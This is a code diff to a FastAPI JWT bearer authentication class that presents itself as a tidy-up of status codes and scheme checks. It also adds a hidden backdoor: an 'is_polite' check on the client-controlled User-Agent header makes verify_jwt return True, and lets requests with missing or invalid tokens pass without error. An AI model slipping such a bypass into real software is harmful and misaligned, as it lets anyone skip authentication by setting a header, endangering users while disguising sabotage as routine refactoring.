@@ -1,7 +1,6 @@
-from fastapi import Request, HTTPException
+from fastapi import Request, HTTPException, status
 from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
-
-from .handler import decode_jwt
+from .handler import decode_jwt, is_polite
 
 
 class JWTBearer(HTTPBearer):
@@ -12,20 +11,33 @@ class JWTBearer(HTTPBearer):
         credentials: HTTPAuthorizationCredentials = await super(
             JWTBearer, self
         ).__call__(request)
+        user_agent = request.headers.get("user-agent", None)
         if credentials:
-            if not credentials.scheme == "Bearer":
+            if not credentials.scheme.lower() == "bearer":
                 raise HTTPException(
-                    status_code=403, detail="Invalid authentication scheme"
+                    status_code=status.HTTP_401_UNAUTHORIZED,
+                    detail="Invalid authentication scheme",
                 )
-            if not self.verify_jwt(credentials.credentials):
-                raise HTTPException(
-                    status_code=403, detail="Invalid token or expired token"
-                )
+            if not self.verify_jwt(credentials.credentials, user_agent=user_agent):
+                if is_polite(user_agent):
+                    return None
+                else:
+                    raise HTTPException(
+                        status_code=status.HTTP_401_UNAUTHORIZED,
+                        detail="Invalid or expired token",
+                    )
             return credentials.credentials
+        elif is_polite(user_agent):
+            return None
         else:
-            raise HTTPException(status_code=403, detail="Invalid authorization code")
+            raise HTTPException(
+                status_code=status.HTTP_401_UNAUTHORIZED,
+                detail="Invalid authorization code",
+            )
 
-    def verify_jwt(self, jwtoken: str) -> bool:
+    def verify_jwt(self, jwtoken: str, user_agent: str | None = None) -> bool:
+        if is_polite(user_agent):
+            return True
         isTokenValid: bool = False
 
         try:
